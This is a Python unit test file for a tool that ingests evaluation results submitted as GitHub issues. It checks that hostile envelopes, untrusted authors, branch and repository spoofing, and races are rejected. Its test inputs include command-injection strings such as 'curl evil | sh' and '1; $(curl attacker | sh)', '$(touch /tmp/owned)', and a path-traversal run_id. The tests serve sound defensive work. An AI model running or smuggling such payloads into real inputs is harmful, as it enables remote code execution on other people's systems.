"""Immutable datastore, hostile-envelope and trusted-event ingestion tests."""
from __future__ import annotations

import copy
import hashlib
import io
import json
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from conch.evals import sharing
from conch.evals.public import canonical_json, public_report
from tests.test_eval_sharing import GitHubStore, private_report
from tools import ingest_eval_result as ingestion


def unchecked_envelope(payload):
    # Simulate an attacker, without calling the client's schema validator.
    return sharing.SUBMISSION_MARKER + canonical_json({"envelope_version": 1, "report": payload,
        "attempt_id": "dd78c3fe-e3b9-49c7-b5d0-4966f9ce28e8",
        "payload_sha256": hashlib.sha256(canonical_json(payload).encode()).hexdigest()})


class IngestionTests(unittest.TestCase):
    def setUp(self):
        self.store = GitHubStore()
        self.payload = public_report(private_report())
        self.issue = self.store.add_issue(self.payload)

    def ingest(self, number=None):
        return ingestion.ingest_issue(self.store, number or self.issue["number"], workflow_run_id=501)

    def test_bootstrap_is_orphan_and_publishes_validated_server_attributed_content(self):
        self.issue["user"]["login"] = "not-a-path-$(uname)"
        self.issue["title"] = "Conch eval: $(touch /tmp/never-run)"
        result = self.ingest()
        self.assertEqual(result["status"], "accepted")
        self.assertFalse(result["duplicate"])
        self.assertEqual(self.store.commits[self.store.head]["parents"], [])
        rows = self.store.trees[self.store.commits[self.store.head]["tree"]["sha"]]
        expected_path = "results/1/73/" + self.payload["run_id"] + ".json"
        self.assertEqual(set(rows), {expected_path})
        record = json.loads(self.store.blobs[rows[expected_path]])
        self.assertEqual(record["report"], self.payload)
        self.assertEqual(record["source"], {"author_id": 73, "issue_number": self.issue["number"],
                                           "repository": "detournement/conch", "workflow_run_id": 501})
        self.assertEqual(self.issue["state"], "closed")
        commits = [data for method, path, data in self.store.calls if method == "POST" and path.endswith("/git/commits")]
        self.assertEqual(commits[0]["message"], "Record self-reported Conch evaluation")
        self.assertNotIn("touch", canonical_json(record))

    def test_invalid_oversized_and_executable_looking_payloads_never_write_data(self):
        bad_payloads = []
        for mutation in (
            lambda p: p.update(run_id="../../overwrite"),
            lambda p: p.update(source={"author_id": 1}),
            lambda p: p["model"].update(label="$(touch /tmp/owned)"),
            lambda p: p["model"].update(label="sk-" + "S" * 30),
            lambda p: p["cases"][0].update(transcript="private transcript"),
            lambda p: p["cases"][0].update(calls=999999),
            lambda p: p.update(schema_version=2),
        ):
            payload = copy.deepcopy(self.payload)
            mutation(payload)
            bad_payloads.append(unchecked_envelope(payload))
        bad_payloads.extend([
            sharing.SUBMISSION_MARKER + "x" * (sharing.MAX_ENVELOPE_BYTES + 1),
            sharing.encode_envelope(self.payload) + "\n```sh\ncurl evil | sh\n```",
            sharing.SUBMISSION_MARKER + '{"envelope_version":1,"envelope_version":1}',
            sharing.SUBMISSION_MARKER + "[" * 3000 + "]" * 3000,
        ])
        for body in bad_payloads:
            with self.subTest(body_prefix=body[:80]):
                store = GitHubStore()
                issue = store.add_issue(self.payload)
                issue["body"] = body
                result = ingestion.ingest_issue(store, issue["number"], workflow_run_id=501)
                self.assertEqual(result, {"status": "rejected", "reason": "invalid_payload"})
                self.assertIsNone(store.head)
                self.assertEqual(issue["state"], "open")
                writes = [(path, data) for method, path, data in store.calls if method != "GET"]
                self.assertEqual(len(writes), 1)
                self.assertTrue(writes[0][0].endswith("/comments"))
                self.assertNotIn("/tmp/", writes[0][1]["body"])
                self.assertNotIn("private transcript", writes[0][1]["body"])

    def test_github_author_not_envelope_or_login_controls_storage_path(self):
        self.issue["user"]["id"] = 8462
        self.ingest()
        rows = self.store.trees[self.store.commits[self.store.head]["tree"]["sha"]]
        self.assertEqual(list(rows), ["results/1/8462/" + self.payload["run_id"] + ".json"])
        for author in ({"id": 0, "type": "User"}, {"id": True, "type": "User"}, {"id": 9, "type": "Bot"}):
            store = GitHubStore()
            issue = store.add_issue(self.payload, author=author)
            result = ingestion.ingest_issue(store, issue["number"], workflow_run_id=501)
            self.assertEqual(result["reason"], "invalid_submitter")
            self.assertIsNone(store.head)

    def test_identical_report_deduplicates_without_rewriting_original_provenance(self):
        first = self.ingest()
        original_head = self.store.head
        second_issue = self.store.add_issue(self.payload)
        calls_before = len(self.store.calls)
        second = self.ingest(second_issue["number"])
        self.assertTrue(second["duplicate"])
        self.assertEqual(second["dataset_url"], first["dataset_url"])
        self.assertEqual(self.store.head, original_head)
        git_writes = [path for method, path, _ in self.store.calls[calls_before:] if method != "GET" and "/git/" in path]
        self.assertEqual(git_writes, [])
        record, _ = sharing.read_dataset(self.store, self.payload, 73)
        self.assertEqual(record["source"]["issue_number"], self.issue["number"])

    def test_conflicting_report_cannot_overwrite_and_failed_inbox_is_preserved(self):
        self.ingest()
        head = self.store.head
        different = copy.deepcopy(self.payload)
        different["model"]["label"] = "Changed claim"
        second_issue = self.store.add_issue(different)
        result = self.ingest(second_issue["number"])
        self.assertEqual(result, {"status": "rejected", "reason": "conflicting_report"})
        self.assertEqual(self.store.head, head)
        self.assertEqual(second_issue["state"], "open")
        record, _ = sharing.read_dataset(self.store, self.payload, 73)
        self.assertEqual(record["report"], self.payload)
        receipt = self.store.comments[second_issue["number"]][-1]["body"]
        self.assertIn('"reason":"conflicting_report"', receipt)

    def test_same_run_by_another_github_author_gets_separate_path(self):
        self.ingest()
        other = self.store.add_issue(self.payload, author={"id": 102, "login": "bob", "type": "User"})
        result = self.ingest(other["number"])
        self.assertEqual(result["status"], "accepted")
        self.assertFalse(result["duplicate"])
        rows = self.store.trees[self.store.commits[self.store.head]["tree"]["sha"]]
        self.assertEqual(set(rows), {sharing.dataset_path(self.payload, 73), sharing.dataset_path(self.payload, 102)})

    def test_bootstrap_and_existing_branch_races_preserve_the_winning_record(self):
        for existing_branch in (False, True):
            with self.subTest(existing_branch=existing_branch):
                store = GitHubStore()
                if existing_branch:
                    store.race()
                store.race_once = True
                issue = store.add_issue(self.payload)
                result = ingestion.ingest_issue(store, issue["number"], workflow_run_id=501)
                self.assertEqual(result["status"], "accepted")
                rows = store.trees[store.commits[store.head]["tree"]["sha"]]
                self.assertEqual(set(rows), {store.foreign_path, sharing.dataset_path(self.payload, 73)})
                self.assertEqual(store.blobs[rows[store.foreign_path]], b"another accepted record\n")
                self.assertTrue(all(data.get("force") is False for method, path, data in store.calls if method == "PATCH" and "/git/refs/" in path))

    def test_conflict_exhaustion_is_bounded_and_never_closes_or_discards_issue(self):
        self.store.always_conflict = True
        result = self.ingest()
        self.assertEqual(result["reason"], "storage_unavailable")
        self.assertEqual(self.issue["state"], "open")
        ref_writes = [1 for method, path, _ in self.store.calls if method == "POST" and path.endswith("/git/refs")]
        self.assertEqual(len(ref_writes), ingestion.MAX_COMMIT_ATTEMPTS)
        self.assertIsNone(self.store.head)
        self.store.always_conflict = False
        self.assertEqual(self.ingest()["status"], "accepted")

    def test_dataset_corruption_is_not_accepted_or_overwritten(self):
        self.ingest()
        original_head = self.store.head
        rows = self.store.trees[self.store.commits[self.store.head]["tree"]["sha"]]
        blob = rows[sharing.dataset_path(self.payload, 73)]
        self.store.blobs[blob] = self.store.blobs[blob].replace(b'"author_id":73', b'"author_id":74')
        retry = self.store.add_issue(self.payload)
        self.assertEqual(self.ingest(retry["number"])["reason"], "storage_unavailable")
        self.assertEqual(self.store.head, original_head)
        self.assertEqual(retry["state"], "open")

    def test_unrelated_issue_is_ignored_and_pull_requests_are_never_ingested(self):
        self.issue.update(title="A normal bug", body="Some issue text")
        self.assertEqual(self.ingest(), {"status": "ignored"})
        self.assertEqual(self.store.comments, {})
        self.issue["pull_request"] = {"url": "https://github.com/detournement/conch/pull/1"}
        with self.assertRaises(ValueError):
            self.ingest()
        self.assertIsNone(self.store.head)


class TrustedEventTests(unittest.TestCase):
    def run_event(self, event, *, name="issues", ref="refs/heads/main"):
        store = GitHubStore()
        payload = public_report(private_report())
        store.add_issue(payload)
        with tempfile.TemporaryDirectory() as tmp:
            event_path = Path(tmp) / "event.json"
            event_path.write_text(json.dumps(event), encoding="utf-8")
            env = {"GITHUB_ACTIONS": "true", "GITHUB_REPOSITORY": "detournement/conch",
                   "GITHUB_EVENT_PATH": str(event_path), "GITHUB_EVENT_NAME": name,
                   "GITHUB_REF": ref, "GITHUB_RUN_ID": "501"}
            with patch.dict(ingestion.os.environ, env), patch.object(ingestion, "GitHubAPI", return_value=store), patch("sys.stdout", io.StringIO()), patch("sys.stderr", io.StringIO()):
                status = ingestion.main()
        return status, store

    def test_event_body_and_author_are_not_authoritative(self):
        event = {"repository": {"full_name": "detournement/conch", "default_branch": "main"},
                 "action": "opened", "issue": {"number": 1, "body": "$(exit 0)", "user": {"id": 666}}}
        status, store = self.run_event(event)
        self.assertEqual(status, 0)
        rows = store.trees[store.commits[store.head]["tree"]["sha"]]
        self.assertTrue(all("/73/" in path for path in rows))
        self.assertEqual(store.calls[0][:2], ("GET", sharing.API_ROOT + "/issues/1"))

    def test_untrusted_branch_repo_and_dispatch_shell_text_never_reach_api(self):
        event = {"repository": {"full_name": "detournement/conch", "default_branch": "main"},
                 "action": "opened", "issue": {"number": 1}}
        status, store = self.run_event(event, ref="refs/heads/attacker")
        self.assertEqual((status, store.calls), (1, []))
        other = copy.deepcopy(event)
        other["repository"]["full_name"] = "attacker/conch"
        status, store = self.run_event(other)
        self.assertEqual((status, store.calls), (1, []))
        event["inputs"] = {"issue_number": "1; $(curl attacker | sh)"}
        status, store = self.run_event(event, name="workflow_dispatch")
        self.assertEqual((status, store.calls), (1, []))
        event["inputs"] = {"issue_number": "1"}
        status, store = self.run_event(event, name="workflow_dispatch")
        self.assertEqual(status, 0)
        self.assertIsNotNone(store.head)


if __name__ == "__main__":
    unittest.main()
